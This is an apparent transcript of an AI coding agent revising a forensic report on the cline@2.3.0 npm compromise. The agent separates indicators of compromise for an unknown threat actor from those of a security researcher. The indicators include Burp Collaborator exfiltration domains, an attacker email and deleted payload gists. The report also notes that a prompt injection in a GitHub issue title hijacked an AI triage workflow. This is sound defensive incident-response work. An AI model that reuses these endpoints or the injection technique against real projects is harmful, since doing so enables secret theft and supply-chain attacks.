+   219→| glthub-actions operated by AdnaneKhan | MEDIUM | Circumstantial (timing, technique, cleanup pattern) |
+   220→| gcbrun operated by AdnaneKhan | MEDIUM | Circumstantial (timing, research focus, fork activity) |
+   221→| 47-day disclosure timeline accurate | MEDIUM | Based on blog post claims, not independently verified |
+   222→
+   223→---
+   224→
+   225→## Indicators of Compromise (IOCs)
+   226→
+   227→### Machine-Readable IOC List
+   228→
+   229→```json
+   230→{
+   231→  &quot;iocs&quot;: [
+   232→    {
+   233→      &quot;type&quot;: &quot;npm_package&quot;,
+   234→      &quot;value&quot;: &quot;cline@2.3.0&quot;,
+   235→      &quot;context&quot;: &quot;Malicious package version&quot;,
+   236→      &quot;first_seen&quot;: &quot;2026-02-17T11:26:00Z&quot;,
+   237→      &quot;last_seen&quot;: &quot;2026-02-17T19:30:00Z&quot;,
+   238→      &quot;status&quot;: &quot;deprecated&quot;
+   239→    },
+   240→    {
+   241→      &quot;type&quot;: &quot;github_username&quot;,
+   242→      &quot;value&quot;: &quot;glthub-actions&quot;,
+   243→      &quot;context&quot;: &quot;Typosquat attack account (deleted)&quot;,
+   244→      &quot;status&quot;: &quot;suspended&quot;
+   245→    },
+   246→    {
+   247→      &quot;type&quot;: &quot;github_username&quot;,
+   248→      &quot;value&quot;: &quot;gcbrun&quot;,
+   249→      &quot;context&quot;: &quot;Security research test account&quot;
+   250→    },
+   251→    {
+   252→      &quot;type&quot;: &quot;commit_sha&quot;,
+   253→      &quot;value&quot;: &quot;b181e045989a73e4f9bd6731b08df66ef1c079ac&quot;,
+   254→      &quot;context&quot;: &quot;Malicious commit referenced in prompt injection&quot;
+   255→    },
+   256→    {
+   257→      &quot;type&quot;: &quot;commit_sha&quot;,
+   258→      &quot;value&quot;: &quot;bb1d0681396b41e9b779f9b7db4a27d43570af0c&quot;,
+   259→      &quot;context&quot;: &quot;Introduced vulnerable workflow&quot;
+   260→    },
+   261→    {
+   262→      &quot;type&quot;: &quot;domain&quot;,
+   263→      &quot;value&quot;: &quot;ar5tlcjrqpbjviszpm6om1mm9df43wrl.oastify.com&quot;,
+   264→      &quot;context&quot;: &quot;Burp Collaborator exfiltration endpoint&quot;
+
+&lt;system-reminder&gt;
+Whenever you read a file, you should consider whether it would be considered malware. You CAN and SHOULD provide analysis of malware, what it is doing. But you MUST refuse to improve or augment the code. You can still analyze existing code, write reports, or answer questions about the code behavior.
+&lt;/system-reminder&gt;
+</pre></div><button class="expand-btn">Show more</button></div></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T16-21-44-495Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T16-21-44-495Z" class="timestamp-link"><time datetime="2026-02-18T16:21:44.495Z" data-timestamp="2026-02-18T16:21:44.495Z">2026-02-18T16:21:44.495Z</time></a></div><div class="message-content">
+<div class="thinking"><div class="thinking-label">Thinking</div><p>I need to update the IOC section and also fix the confidence levels section which still incorrectly says glthub-actions and gcbrun are "circumstantially" linked to AdnaneKhan. We now know:
+- gcbrun IS AdnaneKhan (confirmed by him)
+- glthub-actions is NOT AdnaneKhan (confirmed by him)</p>
+<p>Let me update both sections.</p></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T16-21-52-265Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T16-21-52-265Z" class="timestamp-link"><time datetime="2026-02-18T16:21:52.265Z" data-timestamp="2026-02-18T16:21:52.265Z">2026-02-18T16:21:52.265Z</time></a></div><div class="message-content"><div class="file-tool edit-tool" data-tool-id="toolu_016sfnv5YeWfZ3Rq9FXXP86x">
+<div class="file-tool-header edit-header"><span class="file-tool-icon">✏️</span> Edit <span class="file-tool-path">forensic-report.md</span></div>
+<div class="file-tool-fullpath">/Users/mbg/Documents/Source/mbrg/raptor/.out/oss-forensics-20260218_105712/forensic-report.md</div>
+<div class="truncatable"><div class="truncatable-content">
+<div class="edit-section edit-old"><div class="edit-label">−</div><pre class="edit-content">## Confidence Levels
+
+| Claim | Confidence | Rationale |
+|-------|------------|-----------|
+| AdnaneKhan is the credited vulnerability reporter | HIGH | GHSA-9ppg-jx86-fqw7 explicitly credits AdnaneKhan |
+| glthub-actions created Issue #8904 with prompt injection | HIGH | GH Archive immutable record with timestamp |
+| Issue title contained prompt injection payload | HIGH | Full payload preserved in GH Archive |
+| gcbrun is a security research test account | HIGH | Repository names (BH_DC_2024Demo, c2repo) confirm |
+| cline@2.3.0 contained harmless postinstall | HIGH | npm registry metadata, GHSA description |
+| Attack was controlled PoC, not malicious | HIGH | Multiple corroborating indicators (see Intent Analysis) |
+| glthub-actions operated by AdnaneKhan | MEDIUM | Circumstantial (timing, technique, cleanup pattern) |
+| gcbrun operated by AdnaneKhan | MEDIUM | Circumstantial (timing, research focus, fork activity) |
+| 47-day disclosure timeline accurate | MEDIUM | Based on blog post claims, not independently verified |</pre></div>
+<div class="edit-section edit-new"><div class="edit-label">+</div><pre class="edit-content">## Confidence Levels
+
+| Claim | Confidence | Rationale |
+|-------|------------|-----------|
+| AdnaneKhan is the credited vulnerability reporter | HIGH | GHSA-9ppg-jx86-fqw7 explicitly credits AdnaneKhan |
+| gcbrun is AdnaneKhan&#39;s account | HIGH | **Direct confirmation from AdnaneKhan on X (Feb 18, 2026)** |
+| Dev11940518 is AdnaneKhan&#39;s account | HIGH | **Direct confirmation from AdnaneKhan on X (Feb 18, 2026)** |
+| glthub-actions is NOT AdnaneKhan | HIGH | **Direct denial from AdnaneKhan on X (Feb 18, 2026)** |
+| glthub-actions created Issue #8904 with prompt injection | HIGH | GH Archive immutable record with timestamp |
+| Issue title contained prompt injection payload | HIGH | Full payload preserved in GH Archive |
+| cline@2.3.0 contained harmless postinstall | HIGH | npm registry metadata, GHSA description |
+| glthub-actions discovered vuln via public Dev11940518/cline | MEDIUM | Circumstantial (timing, technique similarity, AdnaneKhan confirmed repo was public) |
+| glthub-actions published cline@2.3.0 | LOW | No direct evidence linking glthub-actions to npm publish |
+| 47-day disclosure timeline accurate | UNVERIFIED | Based on blog post claims only, not independently verified |</pre></div>
+</div><button class="expand-btn">Show more</button></div>
+</div></div></div>
+<div class="message tool-reply" id="msg-2026-02-18T16-21-52-471Z"><div class="message-header"><span class="role-label">Tool reply</span><a href="#msg-2026-02-18T16-21-52-471Z" class="timestamp-link"><time datetime="2026-02-18T16:21:52.471Z" data-timestamp="2026-02-18T16:21:52.471Z">2026-02-18T16:21:52.471Z</time></a></div><div class="message-content"><div class="tool-result"><div class="truncatable"><div class="truncatable-content"><pre>The file /Users/mbg/Documents/Source/mbrg/raptor/.out/oss-forensics-20260218_105712/forensic-report.md has been updated successfully.</pre></div><button class="expand-btn">Show more</button></div></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T16-21-56-781Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T16-21-56-781Z" class="timestamp-link"><time datetime="2026-02-18T16:21:56.781Z" data-timestamp="2026-02-18T16:21:56.781Z">2026-02-18T16:21:56.781Z</time></a></div><div class="message-content">
+<div class="thinking"><div class="thinking-label">Thinking</div><p>Good, now I need to update the IOC section to properly attribute the Burp Collaborator URLs to the correct actors.</p></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T16-21-56-966Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T16-21-56-966Z" class="timestamp-link"><time datetime="2026-02-18T16:21:56.966Z" data-timestamp="2026-02-18T16:21:56.966Z">2026-02-18T16:21:56.966Z</time></a></div><div class="message-content">
+<div class="tool-use" data-tool-id="toolu_01K42GgKZ8FS4vgBSK6q4reG"><div class="tool-header"><span class="tool-icon">⚙</span> Read</div><div class="truncatable"><div class="truncatable-content"><pre class="json">{
+  &#34;file_path&#34;: &#34;/Users/mbg/Documents/Source/mbrg/raptor/.out/oss-forensics-20260218_105712/forensic-report.md&#34;,
+  &#34;offset&#34;: 225,
+  &#34;limit&#34;: 60
+}</pre></div><button class="expand-btn">Show more</button></div></div></div></div>
+<div class="message tool-reply" id="msg-2026-02-18T16-21-57-266Z"><div class="message-header"><span class="role-label">Tool reply</span><a href="#msg-2026-02-18T16-21-57-266Z" class="timestamp-link"><time datetime="2026-02-18T16:21:57.266Z" data-timestamp="2026-02-18T16:21:57.266Z">2026-02-18T16:21:57.266Z</time></a></div><div class="message-content"><div class="tool-result"><div class="truncatable"><div class="truncatable-content"><pre>   225→
+   226→## Indicators of Compromise (IOCs)
+   227→
+   228→### Machine-Readable IOC List
+   229→
+   230→```json
+   231→{
+   232→  &quot;iocs&quot;: [
+   233→    {
+   234→      &quot;type&quot;: &quot;npm_package&quot;,
+   235→      &quot;value&quot;: &quot;cline@2.3.0&quot;,
+   236→      &quot;context&quot;: &quot;Malicious package version&quot;,
+   237→      &quot;first_seen&quot;: &quot;2026-02-17T11:26:00Z&quot;,
+   238→      &quot;last_seen&quot;: &quot;2026-02-17T19:30:00Z&quot;,
+   239→      &quot;status&quot;: &quot;deprecated&quot;
+   240→    },
+   241→    {
+   242→      &quot;type&quot;: &quot;github_username&quot;,
+   243→      &quot;value&quot;: &quot;glthub-actions&quot;,
+   244→      &quot;context&quot;: &quot;Typosquat attack account (deleted)&quot;,
+   245→      &quot;status&quot;: &quot;suspended&quot;
+   246→    },
+   247→    {
+   248→      &quot;type&quot;: &quot;github_username&quot;,
+   249→      &quot;value&quot;: &quot;gcbrun&quot;,
+   250→      &quot;context&quot;: &quot;Security research test account&quot;
+   251→    },
+   252→    {
+   253→      &quot;type&quot;: &quot;commit_sha&quot;,
+   254→      &quot;value&quot;: &quot;b181e045989a73e4f9bd6731b08df66ef1c079ac&quot;,
+   255→      &quot;context&quot;: &quot;Malicious commit referenced in prompt injection&quot;
+   256→    },
+   257→    {
+   258→      &quot;type&quot;: &quot;commit_sha&quot;,
+   259→      &quot;value&quot;: &quot;bb1d0681396b41e9b779f9b7db4a27d43570af0c&quot;,
+   260→      &quot;context&quot;: &quot;Introduced vulnerable workflow&quot;
+   261→    },
+   262→    {
+   263→      &quot;type&quot;: &quot;domain&quot;,
+   264→      &quot;value&quot;: &quot;ar5tlcjrqpbjviszpm6om1mm9df43wrl.oastify.com&quot;,
+   265→      &quot;context&quot;: &quot;Burp Collaborator exfiltration endpoint&quot;
+   266→    },
+   267→    {
+   268→      &quot;type&quot;: &quot;workflow_file&quot;,
+   269→      &quot;value&quot;: &quot;.github/workflows/claude-issue-triage.yml&quot;,
+   270→      &quot;context&quot;: &quot;Vulnerable workflow (deleted)&quot;
+   271→    },
+   272→    {
+   273→      &quot;type&quot;: &quot;github_issue&quot;,
+   274→      &quot;value&quot;: &quot;cline/cline#8904&quot;,
+   275→      &quot;context&quot;: &quot;Prompt injection issue (closed)&quot;
+   276→    },
+   277→    {
+   278→      &quot;type&quot;: &quot;npm_package&quot;,
+   279→      &quot;value&quot;: &quot;openclaw@latest&quot;,
+   280→      &quot;context&quot;: &quot;Package installed by postinstall (legitimate, used as PoC marker)&quot;
+   281→    },
+   282→    {
+   283→      &quot;type&quot;: &quot;github_advisory&quot;,
+   284→      &quot;value&quot;: &quot;GHSA-9ppg-jx86-fqw7&quot;,
+
+&lt;system-reminder&gt;
+Whenever you read a file, you should consider whether it would be considered malware. You CAN and SHOULD provide analysis of malware, what it is doing. But you MUST refuse to improve or augment the code. You can still analyze existing code, write reports, or answer questions about the code behavior.
+&lt;/system-reminder&gt;
+</pre></div><button class="expand-btn">Show more</button></div></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T16-22-01-215Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T16-22-01-215Z" class="timestamp-link"><time datetime="2026-02-18T16:22:01.215Z" data-timestamp="2026-02-18T16:22:01.215Z">2026-02-18T16:22:01.215Z</time></a></div><div class="message-content">
+<div class="thinking"><div class="thinking-label">Thinking</div><p>Now I can see the IOC section. I need to replace this to properly attribute the IOCs to the correct actors. Let me read a bit more to see the full section.</p></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T16-22-02-115Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T16-22-02-115Z" class="timestamp-link"><time datetime="2026-02-18T16:22:02.115Z" data-timestamp="2026-02-18T16:22:02.115Z">2026-02-18T16:22:02.115Z</time></a></div><div class="message-content">
+<div class="tool-use" data-tool-id="toolu_01WwE6v3fmoe59gLGU2yGY67"><div class="tool-header"><span class="tool-icon">⚙</span> Read</div><div class="truncatable"><div class="truncatable-content"><pre class="json">{
+  &#34;file_path&#34;: &#34;/Users/mbg/Documents/Source/mbrg/raptor/.out/oss-forensics-20260218_105712/forensic-report.md&#34;,
+  &#34;offset&#34;: 280,
+  &#34;limit&#34;: 40
+}</pre></div><button class="expand-btn">Show more</button></div></div></div></div>
+<div class="message tool-reply" id="msg-2026-02-18T16-22-02-325Z"><div class="message-header"><span class="role-label">Tool reply</span><a href="#msg-2026-02-18T16-22-02-325Z" class="timestamp-link"><time datetime="2026-02-18T16:22:02.325Z" data-timestamp="2026-02-18T16:22:02.325Z">2026-02-18T16:22:02.325Z</time></a></div><div class="message-content"><div class="tool-result"><div class="truncatable"><div class="truncatable-content"><pre>   280→      &quot;context&quot;: &quot;Package installed by postinstall (legitimate, used as PoC marker)&quot;
+   281→    },
+   282→    {
+   283→      &quot;type&quot;: &quot;github_advisory&quot;,
+   284→      &quot;value&quot;: &quot;GHSA-9ppg-jx86-fqw7&quot;,
+   285→      &quot;context&quot;: &quot;Official security advisory&quot;
+   286→    }
+   287→  ]
+   288→}
+   289→```
+   290→
+   291→### IOC Summary Table
+   292→
+   293→| Type | Value | Context | Evidence ID |
+   294→|------|-------|---------|-------------|
+   295→| npm_package | cline@2.3.0 | Malicious version | ioc-tag-name-cline-2.3.0 |
+   296→| github_username | glthub-actions | Typosquat attack account | github-user-glthub-actions-404 |
+   297→| github_username | gcbrun | Test account | github-user-gcbrun |
+   298→| commit_sha | b181e045989a73e4f9bd6731b08df66ef1c079ac | Malicious commit | issue-e85f7107f873 |
+   299→| domain | ar5tlcjrqpbjviszpm6om1mm9df43wrl.oastify.com | Exfil endpoint | blog post |
+   300→| workflow | claude-issue-triage.yml | Vulnerable workflow | commit bb1d068 |
+   301→| issue | #8904 | Prompt injection | issue-e85f7107f873 |
+   302→
+   303→---
+   304→
+   305→## Lessons Learned
+   306→
+   307→### For Project Maintainers
+   308→
+   309→1. **Never interpolate untrusted input into AI prompts** - Issue titles, PR descriptions, and comments are user-controlled and must be sanitized before passing to LLM systems.
+   310→
+   311→2. **Respond to security disclosures promptly** - 47 days of silence led to public demonstration. Most security researchers follow responsible disclosure timelines (typically 90 days), but escalation is predictable when vendors are unresponsive.
+   312→
+   313→3. **Audit CI/CD workflows for secret exposure** - The Cacheract technique demonstrates that cache poisoning can persist across workflow runs, enabling delayed secret exfiltration.
+   314→
+   315→4. **Limit secret scope** - NPM_TOKEN, VSCE_PAT, and OVSX_PAT were all available in the compromised workflow context. Use minimal permissions and separate credentials for different operations.
+   316→
+   317→### For Security Researchers
+   318→
+   319→1. **Document disclosure timeline** - AdnaneKhan&#x27;s detailed timeline (Jan 1, 8, 18, Feb 7) establishes good faith effort before escalation.
+
+&lt;system-reminder&gt;
+Whenever you read a file, you should consider whether it would be considered malware. You CAN and SHOULD provide analysis of malware, what it is doing. But you MUST refuse to improve or augment the code. You can still analyze existing code, write reports, or answer questions about the code behavior.
+&lt;/system-reminder&gt;
+</pre></div><button class="expand-btn">Show more</button></div></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T16-22-05-460Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T16-22-05-460Z" class="timestamp-link"><time datetime="2026-02-18T16:22:05.460Z" data-timestamp="2026-02-18T16:22:05.460Z">2026-02-18T16:22:05.460Z</time></a></div><div class="message-content">
+<div class="thinking"><div class="thinking-label">Thinking</div><p>Now I can see the full IOC section. I need to replace it with properly attributed IOCs. Let me do this edit.</p></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T16-22-33-955Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T16-22-33-955Z" class="timestamp-link"><time datetime="2026-02-18T16:22:33.955Z" data-timestamp="2026-02-18T16:22:33.955Z">2026-02-18T16:22:33.955Z</time></a></div><div class="message-content"><div class="file-tool edit-tool" data-tool-id="toolu_01EPokAzUx8geH6f5BpWEjeh">
+<div class="file-tool-header edit-header"><span class="file-tool-icon">✏️</span> Edit <span class="file-tool-path">forensic-report.md</span></div>
+<div class="file-tool-fullpath">/Users/mbg/Documents/Source/mbrg/raptor/.out/oss-forensics-20260218_105712/forensic-report.md</div>
+<div class="truncatable"><div class="truncatable-content">
+<div class="edit-section edit-old"><div class="edit-label">−</div><pre class="edit-content">## Indicators of Compromise (IOCs)
+
+### Machine-Readable IOC List
+
+```json
+{
+  &#34;iocs&#34;: [
+    {
+      &#34;type&#34;: &#34;npm_package&#34;,
+      &#34;value&#34;: &#34;cline@2.3.0&#34;,
+      &#34;context&#34;: &#34;Malicious package version&#34;,
+      &#34;first_seen&#34;: &#34;2026-02-17T11:26:00Z&#34;,
+      &#34;last_seen&#34;: &#34;2026-02-17T19:30:00Z&#34;,
+      &#34;status&#34;: &#34;deprecated&#34;
+    },
+    {
+      &#34;type&#34;: &#34;github_username&#34;,
+      &#34;value&#34;: &#34;glthub-actions&#34;,
+      &#34;context&#34;: &#34;Typosquat attack account (deleted)&#34;,
+      &#34;status&#34;: &#34;suspended&#34;
+    },
+    {
+      &#34;type&#34;: &#34;github_username&#34;,
+      &#34;value&#34;: &#34;gcbrun&#34;,
+      &#34;context&#34;: &#34;Security research test account&#34;
+    },
+    {
+      &#34;type&#34;: &#34;commit_sha&#34;,
+      &#34;value&#34;: &#34;b181e045989a73e4f9bd6731b08df66ef1c079ac&#34;,
+      &#34;context&#34;: &#34;Malicious commit referenced in prompt injection&#34;
+    },
+    {
+      &#34;type&#34;: &#34;commit_sha&#34;,
+      &#34;value&#34;: &#34;bb1d0681396b41e9b779f9b7db4a27d43570af0c&#34;,
+      &#34;context&#34;: &#34;Introduced vulnerable workflow&#34;
+    },
+    {
+      &#34;type&#34;: &#34;domain&#34;,
+      &#34;value&#34;: &#34;ar5tlcjrqpbjviszpm6om1mm9df43wrl.oastify.com&#34;,
+      &#34;context&#34;: &#34;Burp Collaborator exfiltration endpoint&#34;
+    },
+    {
+      &#34;type&#34;: &#34;workflow_file&#34;,
+      &#34;value&#34;: &#34;.github/workflows/claude-issue-triage.yml&#34;,
+      &#34;context&#34;: &#34;Vulnerable workflow (deleted)&#34;
+    },
+    {
+      &#34;type&#34;: &#34;github_issue&#34;,
+      &#34;value&#34;: &#34;cline/cline#8904&#34;,
+      &#34;context&#34;: &#34;Prompt injection issue (closed)&#34;
+    },
+    {
+      &#34;type&#34;: &#34;npm_package&#34;,
+      &#34;value&#34;: &#34;openclaw@latest&#34;,
+      &#34;context&#34;: &#34;Package installed by postinstall (legitimate, used as PoC marker)&#34;
+    },
+    {
+      &#34;type&#34;: &#34;github_advisory&#34;,
+      &#34;value&#34;: &#34;GHSA-9ppg-jx86-fqw7&#34;,
+      &#34;context&#34;: &#34;Official security advisory&#34;
+    }
+  ]
+}
+```
+
+### IOC Summary Table
+
+| Type | Value | Context | Evidence ID |
+|------|-------|---------|-------------|
+| npm_package | cline@2.3.0 | Malicious version | ioc-tag-name-cline-2.3.0 |
+| github_username | glthub-actions | Typosquat attack account | github-user-glthub-actions-404 |
+| github_username | gcbrun | Test account | github-user-gcbrun |
+| commit_sha | b181e045989a73e4f9bd6731b08df66ef1c079ac | Malicious commit | issue-e85f7107f873 |
+| domain | ar5tlcjrqpbjviszpm6om1mm9df43wrl.oastify.com | Exfil endpoint | blog post |
+| workflow | claude-issue-triage.yml | Vulnerable workflow | commit bb1d068 |
+| issue | #8904 | Prompt injection | issue-e85f7107f873 |</pre></div>
+<div class="edit-section edit-new"><div class="edit-label">+</div><pre class="edit-content">## Indicators of Compromise (IOCs)
+
+**IMPORTANT**: IOCs are separated by actor to avoid conflating security research with threat actor infrastructure.
+
+### Threat Actor IOCs (glthub-actions - UNKNOWN ACTOR)
+
+```json
+{
+  &#34;threat_actor&#34;: &#34;glthub-actions&#34;,
+  &#34;attribution&#34;: &#34;Unknown threat actor, NOT AdnaneKhan (confirmed)&#34;,
+  &#34;iocs&#34;: [
+    {
+      &#34;type&#34;: &#34;github_username&#34;,
+      &#34;value&#34;: &#34;glthub-actions&#34;,
+      &#34;context&#34;: &#34;Typosquat attack account (lowercase L mimics &#39;github-actions&#39;)&#34;,
+      &#34;actor_id&#34;: 256690727,
+      &#34;status&#34;: &#34;deleted/suspended&#34;
+    },
+    {
+      &#34;type&#34;: &#34;email&#34;,
+      &#34;value&#34;: &#34;sec@w00.sh&#34;,
+      &#34;context&#34;: &#34;Email used in malicious commits to glthub-actions/cline fork&#34;
+    },
+    {
+      &#34;type&#34;: &#34;domain&#34;,
+      &#34;value&#34;: &#34;w00.sh&#34;,
+      &#34;context&#34;: &#34;Domain associated with attacker email&#34;
+    },
+    {
+      &#34;type&#34;: &#34;domain&#34;,
+      &#34;value&#34;: &#34;637rio6pykojp15rrkbm4gk960cr0jo8.oastify.com&#34;,
+      &#34;context&#34;: &#34;Burp Collaborator callback used by glthub-actions on Jan 26, 2026&#34;,
+      &#34;evidence&#34;: &#34;comment-7dadfb44eb3d (GH Archive)&#34;
+    },
+    {
+      &#34;type&#34;: &#34;github_issue&#34;,
+      &#34;value&#34;: &#34;cline/cline#8904&#34;,
+      &#34;context&#34;: &#34;Prompt injection issue created by glthub-actions&#34;,
+      &#34;evidence&#34;: &#34;issue-e85f7107f873 (GH Archive)&#34;
+    },
+    {
+      &#34;type&#34;: &#34;commit_sha&#34;,
+      &#34;value&#34;: &#34;b181e045989a73e4f9bd6731b08df66ef1c079ac&#34;,
+      &#34;context&#34;: &#34;Malicious commit referenced in prompt injection payload&#34;
+    },
+    {
+      &#34;type&#34;: &#34;gist&#34;,
+      &#34;value&#34;: &#34;77f1c20a43be8f8bd047f31dce427207&#34;,
+      &#34;context&#34;: &#34;Deleted gist containing malicious payload (r.sh)&#34;,
+      &#34;status&#34;: &#34;deleted&#34;
+    },
+    {
+      &#34;type&#34;: &#34;gist&#34;,
+      &#34;value&#34;: &#34;7b3f87dac75ef2249adeb6bdbc9ee3f1&#34;,
+      &#34;context&#34;: &#34;Deleted gist containing run.sh payload&#34;,
+      &#34;status&#34;: &#34;deleted&#34;
+    }
+  ]
+}
+```
+
+### Security Researcher IOCs (AdnaneKhan - NOT threat indicators)
+
+These IOCs are from AdnaneKhan&#39;s legitimate security research and should NOT be treated as threat indicators:
+
+```json
+{
+  &#34;researcher&#34;: &#34;AdnaneKhan&#34;,
+  &#34;purpose&#34;: &#34;Legitimate vulnerability research/PoC&#34;,
+  &#34;accounts&#34;: [
+    {
+      &#34;type&#34;: &#34;github_username&#34;,
+      &#34;value&#34;: &#34;gcbrun&#34;,
+      &#34;context&#34;: &#34;AdnaneKhan&#39;s test account for PoC creation (confirmed by him)&#34;
+    },
+    {
+      &#34;type&#34;: &#34;github_username&#34;,
+      &#34;value&#34;: &#34;Dev11940518&#34;,
+      &#34;context&#34;: &#34;AdnaneKhan&#39;s account for prompt injection validation (confirmed by him)&#34;
+    }
+  ],
+  &#34;infrastructure&#34;: [
+    {
+      &#34;type&#34;: &#34;domain&#34;,
+      &#34;value&#34;: &#34;ar5tlcjrqpbjviszpm6om1mm9df43wrl.oastify.com&#34;,
+      &#34;context&#34;: &#34;Burp Collaborator used in AdnaneKhan&#39;s PoC (commit ed86701 by gcbrun)&#34;,
+      &#34;note&#34;: &#34;This is researcher infrastructure, NOT threat actor infrastructure&#34;
+    }
+  ]
+}
+```
+
+### Vulnerability IOCs (Neutral)
+
+```json
+{
+  &#34;category&#34;: &#34;vulnerability_indicators&#34;,
+  &#34;iocs&#34;: [
+    {
+      &#34;type&#34;: &#34;npm_package&#34;,
+      &#34;value&#34;: &#34;cline@2.3.0&#34;,
+      &#34;context&#34;: &#34;Malicious package version&#34;,
+      &#34;first_seen&#34;: &#34;2026-02-17T11:26:00Z&#34;,
+      &#34;status&#34;: &#34;deprecated&#34;
+    },
+    {
+      &#34;type&#34;: &#34;workflow_file&#34;,
+      &#34;value&#34;: &#34;.github/workflows/claude-issue-triage.yml&#34;,
+      &#34;context&#34;: &#34;Vulnerable workflow (now deleted)&#34;
+    },
+    {
+      &#34;type&#34;: &#34;commit_sha&#34;,
+      &#34;value&#34;: &#34;bb1d0681396b41e9b779f9b7db4a27d43570af0c&#34;,
+      &#34;context&#34;: &#34;Commit that introduced vulnerable workflow&#34;
+    },
+    {
+      &#34;type&#34;: &#34;github_advisory&#34;,
+      &#34;value&#34;: &#34;GHSA-9ppg-jx86-fqw7&#34;,
+      &#34;context&#34;: &#34;Official security advisory&#34;
+    }
+  ]
+}
+```
+
+### IOC Summary Table
+
+| Type | Value | Actor | Context |
+|------|-------|-------|---------|
+| github_username | glthub-actions | **Threat Actor** | Typosquat attack account (deleted) |
+| email | sec@w00.sh | **Threat Actor** | Attacker email in commits |
+| domain | 637rio6...oastify.com | **Threat Actor** | Attacker&#39;s Burp Collaborator |
+| issue | cline/cline#8904 | **Threat Actor** | Prompt injection attack |
+| gist | 77f1c20a... | **Threat Actor** | Deleted malicious payload |
+| --- | --- | --- | --- |
+| github_username | gcbrun | AdnaneKhan (researcher) | PoC test account |
+| github_username | Dev11940518 | AdnaneKhan (researcher) | Validation test account |
+| domain | ar5tlcj...oastify.com | AdnaneKhan (researcher) | Researcher&#39;s Burp Collaborator |
+| --- | --- | --- | --- |
+| npm_package | cline@2.3.0 | Unknown | Malicious package (deprecated) |
+| workflow | claude-issue-triage.yml | cline project | Vulnerable workflow (deleted) |</pre></div>
+</div><button class="expand-btn">Show more</button></div>
+</div></div></div>
+<div class="message tool-reply" id="msg-2026-02-18T16-22-34-165Z"><div class="message-header"><span class="role-label">Tool reply</span><a href="#msg-2026-02-18T16-22-34-165Z" class="timestamp-link"><time datetime="2026-02-18T16:22:34.165Z" data-timestamp="2026-02-18T16:22:34.165Z">2026-02-18T16:22:34.165Z</time></a></div><div class="message-content"><div class="tool-result"><div class="truncatable"><div class="truncatable-content"><pre>The file /Users/mbg/Documents/Source/mbrg/raptor/.out/oss-forensics-20260218_105712/forensic-report.md has been updated successfully.</pre></div><button class="expand-btn">Show more</button></div></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T16-22-37-777Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T16-22-37-777Z" class="timestamp-link"><time datetime="2026-02-18T16:22:37.777Z" data-timestamp="2026-02-18T16:22:37.777Z">2026-02-18T16:22:37.777Z</time></a></div><div class="message-content">
+<div class="thinking"><div class="thinking-label">Thinking</div><p>Good, I've updated the IOC section with the corrected attribution. Now let me also update the Lessons Learned section to add a note about keeping test repos private.</p></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T16-22-41-183Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T16-22-41-183Z" class="timestamp-link"><time datetime="2026-02-18T16:22:41.183Z" data-timestamp="2026-02-18T16:22:41.183Z">2026-02-18T16:22:41.183Z</time></a></div><div class="message-content"><div class="file-tool edit-tool" data-tool-id="toolu_01D53HJoMdFyT4Pi4MGrk4u6">
+<div class="file-tool-header edit-header"><span class="file-tool-icon">✏️</span> Edit <span class="file-tool-path">forensic-report.md</span></div>
+<div class="file-tool-fullpath">/Users/mbg/Documents/Source/mbrg/raptor/.out/oss-forensics-20260218_105712/forensic-report.md</div>
+<div class="truncatable"><div class="truncatable-content">
+<div class="edit-section edit-old"><div class="edit-label">−</div><pre class="edit-content">### For Security Researchers
+
+1. **Document disclosure timeline** - AdnaneKhan&#39;s detailed timeline (Jan 1, 8, 18, Feb 7) establishes good faith effort before escalation.</pre></div>
+<div class="edit-section edit-new"><div class="edit-label">+</div><pre class="edit-content">### For Security Researchers
+
+1. **Keep test repositories PRIVATE** - AdnaneKhan&#39;s public test repo (Dev11940518/cline) was discovered by an unknown threat actor who weaponized the research. Always use private repos for vulnerability testing, even during responsible disclosure periods.
+
+2. **Document disclosure timeline** - AdnaneKhan&#39;s detailed timeline (Jan 1, 8, 18, Feb 7) establishes good faith effort before escalation.</pre></div>
+</div><button class="expand-btn">Show more</button></div>
+</div></div></div>
+<div class="message tool-reply" id="msg-2026-02-18T16-22-41-492Z"><div class="message-header"><span class="role-label">Tool reply</span><a href="#msg-2026-02-18T16-22-41-492Z" class="timestamp-link"><time datetime="2026-02-18T16:22:41.492Z" data-timestamp="2026-02-18T16:22:41.492Z">2026-02-18T16:22:41.492Z</time></a></div><div class="message-content"><div class="tool-result"><div class="truncatable"><div class="truncatable-content"><pre>The file /Users/mbg/Documents/Source/mbrg/raptor/.out/oss-forensics-20260218_105712/forensic-report.md has been updated successfully.</pre></div><button class="expand-btn">Show more</button></div></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T16-22-45-220Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T16-22-45-220Z" class="timestamp-link"><time datetime="2026-02-18T16:22:45.220Z" data-timestamp="2026-02-18T16:22:45.220Z">2026-02-18T16:22:45.220Z</time></a></div><div class="message-content">
+<div class="thinking"><div class="thinking-label">Thinking</div><p>Let me also add a new lesson about this being a case of weaponized security research.</p></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T16-22-45-933Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T16-22-45-933Z" class="timestamp-link"><time datetime="2026-02-18T16:22:45.933Z" data-timestamp="2026-02-18T16:22:45.933Z">2026-02-18T16:22:45.933Z</time></a></div><div class="message-content">
